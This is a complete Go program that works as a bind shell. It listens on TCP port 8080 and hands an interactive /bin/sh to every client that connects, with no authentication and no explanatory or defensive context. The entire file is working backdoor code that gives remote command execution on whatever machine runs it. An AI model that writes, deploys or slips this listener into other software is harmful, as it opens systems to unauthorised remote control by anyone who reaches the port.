package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	listen, err := net.Listen("tcp", ":8080")
	if err != nil {
		log.Fatal(err)
	}

	log.Println("listening on :8080")

	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Println(err)
			continue
		}

		go handle(conn)
	}
}

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)

	if err := cmd.Run(); err != nil {
		conn.Write([]byte(err.Error()))
	}

	conn.Close()
}
